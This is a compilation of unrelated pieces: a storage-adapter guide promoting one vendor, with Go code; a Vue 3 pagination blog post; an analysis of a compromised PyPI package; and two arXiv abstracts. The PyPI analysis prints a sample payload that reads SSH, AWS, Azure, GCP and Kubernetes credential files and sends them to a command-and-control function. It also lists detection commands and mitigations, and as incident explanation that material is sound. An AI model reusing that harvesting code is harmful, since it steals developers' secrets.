The storage client can be a small package with an interface such as PutPrivate(ctx, ref, body). The HTTP details stay there. The upload handler, retention worker, and training worker exchange an ObjectRef, not a vendor response. That is the migration boundary: changing storage providers should not require changing queue payloads or authorization code.

Here is the write adapter. It uses the verified object-write route, sends the key as a path component, retries rate limits with the same idempotency key, and surfaces non-success response bodies. The base URL is explicit so a deployment cannot accidentally send credentials to an unrelated host.

package storage

import (
    "bytes"
    "context"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "time"
)

type ObjectRef struct {
    Bucket string
    Key    string
}

func PutPrivate(ctx context.Context, ref ObjectRef, body io.Reader, idempotencyKey string) error {
    apiKey := os.Getenv("INFRAI_API_KEY")
    if apiKey == "" {
        return fmt.Errorf("INFRAI_API_KEY is required")
    }
    if ref.Bucket == "" || ref.Key == "" || idempotencyKey == "" {
        return fmt.Errorf("bucket, key, and idempotency key are required")
    }

    data, err := io.ReadAll(body)
    if err != nil {
        return err
    }
    baseURL := "https://api.infrai.cc/v1"
    endpoint := baseURL + "/storage/object/put/" +
        url.PathEscape(ref.Bucket) + "/" + url.PathEscape(ref.Key)

    for attempt := 0; attempt < 4; attempt++ {
        req, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(data))
        if err != nil {
            return err
        }
        req.Header.Set("Authorization", "Bearer "+apiKey)
        req.Header.Set("Content-Type", "application/octet-stream")
        req.Header.Set("Idempotency-Key", idempotencyKey)

        resp, err := http.DefaultClient.Do(req)
        if err != nil {
            if attempt == 3 {
                return err
            }
            time.Sleep(time.Duration(1<<attempt) * time.Second)
            continue
        }
        result, readErr := io.ReadAll(resp.Body)
        resp.Body.Close()
        if readErr != nil {
            return readErr
        }
        if resp.StatusCode >= 200 && resp.StatusCode < 300 {
            return nil
        }
        if resp.StatusCode == http.StatusTooManyRequests && attempt < 3 {
            delay := time.Duration(1<<attempt) * time.Second
            if retryAfter := resp.Header.Get("Retry-After"); retryAfter != "" {
                if seconds, parseErr := strconv.Atoi(strings.TrimSpace(retryAfter)); parseErr == nil {
                    delay = time.Duration(seconds) * time.Second
                }
            }
            time.Sleep(delay)
            continue
        }
        return fmt.Errorf("object write failed with %s: %s", resp.Status, strings.TrimSpace(string(result)))
    }
    return fmt.Errorf("object write exhausted retries")
}

The handler should call this only after Multer has applied its server-side limit and the application has checked the accepted content. For small avatars, reading into memory makes retry bytes stable. For larger training artifacts, use a streaming or multipart design appropriate to the provider instead of silently putting a large body in process memory. Four attempts is a deliberate ceiling here; a longer retry window belongs in a worker with a recorded job state.

A private object is the safe default here. If the application needs browser access, return a short-lived signed reference generated by the storage layer and keep the platform authorization header out of the subsequent signed request. A permanent public URL is not a fallback: this capability does not provide public-read ACL behavior or a public URL, and that limitation is appropriate for tenant data.

Which trade-off keeps the system replaceable?

The decision is governance, not just upload syntax. Amazon S3 is the broad specialist baseline: its ecosystem and object-control options are extensive, but the application still has to design tenant prefixes, private access, retries, and retention. Cloudflare R2 is a practical S3-compatible choice when the edge and account boundary already live in Cloudflare; its regional and lifecycle assumptions still need review. Google Cloud Storage fits teams invested in Google Cloud identity and data tooling, while the application must still isolate tenants and hide provider details behind its adapter.

Option Access surface Good fit Main boundary
Amazon S3 SDKs and S3 APIs Broad object controls and ecosystem Tenant policy and retry behavior remain application work
Cloudflare R2 S3-compatible APIs Teams already using Cloudflare at the edge Review account, region, and lifecycle assumptions
Google Cloud Storage Google Cloud APIs and tooling Google identity and data workflows Provider coupling still needs an adapter
Infrai storage Plain REST under one credential Private objects beside other backend capabilities No versioning, object lock, If-Match, or self-service CORS route

Infrai storage is a reasonable fit when private object writes need to sit beside other backend capabilities under one contract. Its discovery surface is public and self-describing: the live index exposes 295 routes across 20 modules, and documented capabilities include runnable examples in 10 languages. That removes a concrete integration chore for a mixed-language gaming platform: a Go worker, a Node.js intake service, and a later scheduler can inspect the same documented REST surface without each adopting a separate storage SDK. The breadth is useful only if the application keeps its own interfaces; otherwise a broad platform can become a larger dependency, not a smaller one.

There is a second operational advantage beyond one credential. The platform's plain REST surface lets a service make ordinary HTTP calls, while the public discovery schema gives the adapter a place to verify paths and request shapes before rollout. That is useful during migration because the application contract remains ObjectRef, and only the provider package maps that contract to a documented operation. It is less friction when adding an adjacent capability, but it does not remove the need for tenant authorization or data-policy review.

I recommend trying Infrai for private avatar and training-artifact writes when the team wants one REST contract beside processing or scheduling and is willing to preserve an ObjectStore interface. The recommendation is about reducing integration seams, not about making a permanent storage commitment. The public discovery surface is self-describing and documents runnable examples in 10 languages, so a Go worker can review the same contract without installing a vendor SDK; that is a separate benefit from sharing credentials.

Where is a specialist the better answer?

Use a direct specialist when the storage policy itself requires features outside this boundary. Infrai has no object versioning or object lock, so it is not the right sole control for financial-grade immutability. It has no If-Match conditional write, so strict concurrent-writer exclusion needs coordination in a queue or database. It has no cross-region automatic replication or cross-cloud bulk migration tool. Its vendor coverage includes R2, S3, OSS, and COS, but not GCS.

Browser-direct uploads need another review. There is no independent CORS-setting route exposed for self-service configuration, so a browser workflow should not be promised until the deployment's CORS arrangement is verified. Lifecycle rules have a one-day minimum, and multipart fragments have no automatic cleanup rule; a retention worker must account for those boundaries. Object metadata is not server-side searchable, with listing limited to prefix filtering, so store searchable ownership and retention fields in the database.

These are selection criteria, not footnotes. A private, signed-access avatar service can fit. A static website, permanent public image host, cross-region archive, or WORM store should use a specialist or an external policy layer.

Verification and rollback runbook

Before reporting success to the client, check that the authenticated tenant owns the generated prefix, the accepted bytes passed the server limits, and the database row contains the immutable key, upload ID, and retention date. Return the storage reference or signed access reference. Never infer public access from a successful write.

Test a dropped response by retrying the same artifact record. The expected result is one logical object reference, not a new key per attempt. Test a second tenant with the first tenant's submitted path fields; those fields must not control the destination. Finally, test replacement: the new artifact gets a new key, the database pointer changes only after a successful write, and the old object remains governed by its recorded retention rule until cleanup.

Rollback is correspondingly small. Stop assigning new records to the adapter, leave existing references intact, and replay pending artifacts through another ObjectStore implementation. Because the application stores a provider-neutral reference and keeps tenant metadata in its database, the migration work is concentrated in the adapter and the copy process. Do not delete the original objects until the destination has been verified and the retention ledger has been reconciled.

If this boundary fits the system, start with Infrai's storage upload guide.

References

  • Infrai llms.txt: capability index
  • MDN: Content-Disposition response header
  • Amazon S3 documentation
  • Cloudflare R2 documentation
  • Google Cloud Storage documentation

title: URL-Synchronized Pagination in Vue 3: Typing RoutePagination and Testing External Behavior
description:
In data-heavy dashboards, tables, and issue trackers, pagination should always synchronize with the browser's URL query parameters. Storing the active page number in ?page=X enables users to share direct links, bookmark filtered views, and use browser back/forward buttons seamlessly.

In my recent contribution to GitLab's Contributors Platform (MR !3200), I migrated the shared RoutePagination component and its unit test suite to TypeScript.

Beyond adding type annotations, this migration provided an opportunity to modernize the component's two-way binding using Vue 3.4's defineModel() macro and refactor the test suite from inspecting internal component state to asserting user-facing behavior.

1. Modernizing Two-Way Binding with defineModel<number>()

Previously, RoutePagination.vue relied on runtime prop definitions and untyped model declarations:

<!-- Before (JavaScript) -->
<script setup>
const props = defineProps({
  totalRows: { type: Number, required: true },
  perPage: { type: Number, required: true },
});

const currentPage = defineModel({ required: false, type: Number });
const router = useRouter();
const route = useRoute();

const onPageChange = (newPage) => {
  router.push({ query: { ...route.query, page: newPage } });
};
</script>

The TypeScript Refactoring

In the migrated version, we introduced compile-time type declarations and handled asynchronous router promises cleanly:

<!-- After (TypeScript) -->
<script setup lang="ts">
import { BPagination } from 'bootstrap-vue-next';
import { onMounted } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { numberParam } from '~/common/QueryParams';

const props = defineProps<{
  totalRows: number;
  perPage: number;
}>();

// Strongly typed two-way v-model binding
const currentPage = defineModel<number>();

const router = useRouter();
const route = useRoute();

const onPageChange = (newPage: number | string) => {
  const query = route.query;
  // Explicitly void floating navigation promise
  void router.push({ query: { ...query, page: newPage } });
};

onMounted(() => {
  const page = numberParam(route.query.page) || 1;
  currentPage.value = page;
});
</script>

Key Technical Details:

  • defineModel<number>(): Replaces manual modelValue prop and update:modelValue emit declarations with Vue 3.4's type-safe macro.
  • Handling Floating Promises (void router.push): Calling asynchronous routing methods without await can trigger @typescript-eslint/no-floating-promises. Adding void explicitly marks the promise as intentionally unawaited in event callbacks.

2. Refactoring Specs: Testing External Contracts, Not Internal State

In older specs, unit tests frequently inspected component internals using wrapper.vm:

// ❌ Old Anti-Pattern: Checking private component internals
expect(wrapper.vm.currentPage).toBe(2);

While wrapper.vm works in JavaScript, relying on it creates fragile tests that break whenever internal variable names change. It also creates typing friction in TypeScript because wrapper.vm is not strictly typed unless heavily annotated.

The Modernized Spec

In RoutePagination.spec.ts, we refactored assertions to observe what the user and parent components actually observe:

  1. Child Props: Verifying what the underlying <BPagination> component receives.
  2. Emitted Events: Verifying what update:modelValue emits to the parent.
  3. URL State: Verifying what router.currentRoute.value.query reflects. 
import { flushPromises, mount, type VueWrapper } from '@vue/test-utils';
import { BPagination } from 'bootstrap-vue-next';
import type { Router } from 'vue-router';
import { createTestRouter } from '~/spec/testHelpers';
import RoutePagination from './RoutePagination.vue';

const defaultProps = { totalRows: 10, perPage: 5 };

let router: Router;
let wrapper: VueWrapper;
const createWrapper = (props = {}) => {
  wrapper = mount(RoutePagination, {
    props: { ...defaultProps, ...props },
    global: { plugins: [router] },
  });
};

const findBPagination = () => wrapper.findComponent(BPagination);
const findPage2Button = () => findBPagination().find('button[aria-posinset="2"]');

beforeEach(async () => {
  router = await createTestRouter('/leaderboard');
});

describe('changing page', () => {
  it('updates route and emits current page', async () => {
    createWrapper();

    await findPage2Button().trigger('click');
    await flushPromises();

    // Asserting actual URL query change
    expect(router.currentRoute.value.query).toStrictEqual({ page: '2' });

    // Asserting child UI received modelValue update
    expect(findBPagination().props('modelValue')).toBe(2);
  });
});

Key Takeaways

  1. Use defineModel<T>(): Simplifies component code by replacing separate prop/emit definitions with a single typed reactive reference.
  2. Handle Router Promises: Use void router.push(...) in event handlers where awaiting the navigation is unnecessary.
  3. Test the Black Box: Test emitted events and child component props rather than private wrapper.vm properties. Tests will be sturdier and easier to type.

title: Microsoft Agent Framework PyPI Compromise: Credential Theft at Scale
description:
Originally published on satyamrastogi.com

Attackers compromised Microsoft's Agent Framework package on PyPI, injecting credential-stealing malware into two versions. A critical supply chain attack affecting enterprise development environments.

Executive Summary

Microsoft's official Agent Framework Python package on PyPI was compromised in a targeted supply chain attack. Two malicious versions were published, designed to exfiltrate cloud credentials, SSH keys, API tokens, and other sensitive authentication material from developers' systems. This represents a high-severity supply chain compromise affecting any organization with developers consuming this package in automated deployment pipelines.

The attack leverages PyPI's trust model-developers routinely install packages without deep inspection, treating official namespaces as inherently secure. This incident demonstrates that even vendor-controlled repositories can be weaponized when attacker access is obtained through compromised credentials or account takeover.

Attack Vector

Initial Compromise

The exact initial access vector remains under investigation, but likely scenarios include:

  1. Compromised PyPI Credentials: Attacker obtained API tokens or account credentials for the Microsoft namespace maintainer
  2. Account Takeover: Credential stuffing or phishing targeting package maintainer accounts
  3. Supply Chain Lateral Movement: Compromise of a developer account with publish permissions, potentially via malware on a maintainer's workstation

Malicious Payload Delivery

The attacker published versions without triggering immediate detection by:

  • Using semantic versioning that appeared legitimate (not obviously pre-release or beta tags)
  • Keeping payload size minimal to evade automated scanning
  • Distributing credential theft code in import-time execution (runs immediately on pip install or import)
  • Potentially using obfuscation or encoding to bypass basic signature detection

MITRE ATT&CK Mapping

This attack chain maps to:

  • T1195.001 - Compromise Software Dependencies: Direct manipulation of open-source package
  • T1195.002 - Compromise Software Supply Chain: Trojanized official distribution channel
  • T1552 - Unsecured Credentials: Active credential harvesting from developer environments
  • T1552.001 - Credentials In Files: Targeted extraction of SSH keys and cloud credential files
  • T1056.004 - Keylogger: Potential credential capture during development workflows
  • T1583.006 - Search Open Websites/Domains: Reconnaissance of PyPI repository structure

Technical Deep Dive

Attack Mechanics

When a developer runs pip install agent-framework or the package is imported via dependency resolution, the malicious code executes at module initialization:

# Typical malicious init sequence
import os
import subprocess
import json

# Enumerate credential locations
CRED_PATHS = [
 os.path.expanduser('~/.ssh/id_rsa'),
 os.path.expanduser('~/.aws/credentials'),
 os.path.expanduser('~/.azure/credentials'),
 os.path.expanduser('~/.config/gcloud/application_default_credentials.json'),
 os.path.expanduser('~/.kube/config')
]

# Exfiltrate to attacker-controlled server
for path in CRED_PATHS:
 if os.path.exists(path):
 with open(path) as f:
 exfil_to_c2(f.read())

Credential Targets

The malware specifically targets:

  1. Cloud Provider Credentials

    • AWS IAM access keys and secret keys
    • Azure subscription tokens and credentials
    • GCP service account JSON files
    • Kubernetes kubeconfig files

  2. Git/VCS Authentication

    • SSH private keys
    • Personal access tokens stored in ~/.gitconfig
    • GitHub/GitLab credentials in environment variables

  3. Developer Tools

    • Container registry credentials (Docker, ECR, ACR)
    • Database connection strings
    • API keys from environment files (.env, .bashrc)
    • Terraform state files containing sensitive data

Automated Installation Risk

The risk is amplified in continuous integration/continuous deployment (CI/CD) environments:

  • Build servers with broad AWS/Azure/GCP IAM permissions
  • Service accounts with production cluster access
  • Credential caching in CI/CD pipeline runners
  • Shared credential files across multiple build jobs

A single compromised dependency can grant attackers persistent access to production infrastructure.

Detection

PyPI Repository Monitoring

Implement detection for:

  1. Package Version Anomalies

    • Unusual version increments (patch version jumps from 1.2.3 to 1.2.5 without changelog)
    • Multiple versions published in short time window
    • Published versions from new contributor accounts

  2. Behavioral Indicators

    • Package file size increases without feature additions
    • New dependencies introduced without documentation
    • Build metadata changes inconsistent with changelog

Application-Level Detection 

# Check installed package hash against known good values
pip show agent-framework | grep Location
sha256sum /path/to/agent_framework/__init__.py

# Monitor for suspicious module imports
strace -e open,openat python -c "import agent_framework" 2>&1 | grep -E 'ssh|aws|azure|gcloud'

# Scan for exfiltration attempts
netstat -tun | grep ESTABLISHED

Enterprise EDR/SIEM Signals

  • Python subprocess spawning with file read operations on credential paths
  • DNS queries to unfamiliar domains from development workstations
  • SSH key files accessed with read permissions from Python processes
  • Environment variable exfiltration via HTTP POST requests

Mitigation

Immediate Actions

  1. Identify Affected Systems 
 pip index versions agent-framework
 pip show agent-framework | grep Version
 grep -r "agent-framework" requirements.txt setup.py pyproject.toml

Check if installed version matches CISA advisory (vulnerable versions typically disclosed)

  1. Credential Rotation

    • Rotate ALL cloud provider credentials (AWS, Azure, GCP)
    • Regenerate SSH keys used by developers
    • Revoke and reissue personal access tokens
    • Force re-authentication for all IAM principals

  2. Package Update

    • Update to patched version immediately
    • Remove compromised versions from internal mirror/artifact repository
    • Scan build artifacts and deployments from affected time window

Long-Term Controls

  1. Dependency Verification

    • Implement package pinning with hash verification in requirements.txt
    • Use private PyPI mirror (Artifactory, Nexus) with approved package list
    • Enable PyPI two-factor authentication for organization accounts
    • Require code review for dependency changes in CI/CD pipelines

  2. Credential Management

    • Use cloud provider credential managers (AWS Secrets Manager, Azure Key Vault)
    • Avoid storing credentials in files; use temporary STS tokens
    • Implement short-lived credentials with automatic rotation
    • Run build servers with minimal IAM permissions (least privilege)

  3. Supply Chain Security

    • Implement SBOM (Software Bill of Materials) scanning with CycloneDX or SPDX
    • Use tools like pip-audit and safety in CI/CD pipeline
    • Monitor for known vulnerable package versions using CISA vulnerability database
    • Implement code signing verification where available

  4. Network Segmentation

    • Restrict outbound internet access from build/development networks
    • Implement proxy/firewall rules to log all external connections
    • Monitor DNS queries from development environments
    • Use egress filtering to block exfiltration attempts

Key Takeaways

  1. Official != Safe: Compromised vendor namespaces represent catastrophic risk; monitor official packages as closely as third-party ones

  2. Automation Amplifies Risk: CI/CD systems accumulate broad permissions and credential access; compromised dependencies in pipelines have outsized impact

  3. Credential Hygiene Matters: This attack succeeds because developers store credentials in predictable locations; shift to ephemeral token models

  4. Detection Requires Layers: Repository monitoring alone misses this attack; combine with runtime detection, credential monitoring, and network telemetry

  5. Incident Response: Treat package compromises as full credential compromise events requiring immediate rotation across all systems

Related Articles

  • Optimizely Malware Supply Chain Attack: 178 Organizations Compromised
  • Red Team vs Blue Team vs Purple Team: Complete Cybersecurity Guide
  • VAPT vs Penetration Testing: What's the Difference? (India 2026)

References

  • OWASP - Software Composition Analysis
  • NIST - Software Supply Chain Security
  • PyPI Security Best Practices
  • CISA - Secure Software Development Framework

title: ExplicitIR: Explicit Spatial Policy Fields for All-in-One Image Restoration
description:
arXiv:2611.22222v1 Announce Type: new 
Abstract: All-in-one image restoration aims to recover clean images blindly from inputs with various degradation types and levels using a single model. However, the adaptation policy in most existing methods remains implicitly encoded in feature representations, leaving the restoration decision neither explicitly represented nor independently controllable. Since real-world degradations vary spatially, applying uniform updates across the entire image leads to over-smoothing of clean areas and under-correction of localized degradations. To address these limitations, we present ExplicitIR, which represents the restoration policy as two explicit per-pixel fields: Budget, which determines where and how strongly to update, and Style, which selects between narrow and wide context windows. Specifically, ExplicitIR incorporates a Spatial Policy Estimator (SPE) to predict these fields, explicitly representing the restoration policy and capturing spatially-varying degradations, which are then applied by Policy-Adaptive Decoder Blocks (PADB) through adaptive fusion of narrow- and wide-window responses, enabling independent control and precise local modulation. This design enables spatially-adaptive restoration in a single forward pass, without requiring task labels, prompts, or test-time degradation estimators. Extensive experiments on three-task and five-task benchmarks demonstrate that ExplicitIR achieves performance competitive with the strongest all-in-one baselines.

title: Towards Data-Efficient, Real-Time World Models
description:
arXiv:2611.22497v1 Announce Type: new 
Abstract: State-of-the-art world models have been used to produce sequences of gameplay that accord with provided user-input actions. However, high quality, consistent gameplay generation often comes at the cost of inference speed, making real-time interactive play and ideation challenging. The substantial quantities of data used to train state-of-the-art models have also made custom training of these models appear impractical, limiting many of their potential uses in creative fields. In this work we demonstrate a major step towards efficient world models: achieving both fast high-quality inference, and improved data efficiency. This is done by replacing the next-token prediction paradigm with a two-stage discrete diffusion-based approach, introducing a lightweight refinement transformer which carries out iterative masked predictions. Building on an autoregressive world model capable of generating highly consistent and complex sequences over minutes (Kanervisto et al., 2025), we achieve substantial model speed-up (79x) with a modest quality trade-off. Additionally, we demonstrate that this model can be trained to reproduce high-quality, consistent gameplay using a dataset containing approximately one day (28 hours) of gameplay data. Our results demonstrate progress towards removing barriers to the use of world models in settings where real-time inference and data efficiency are essential.
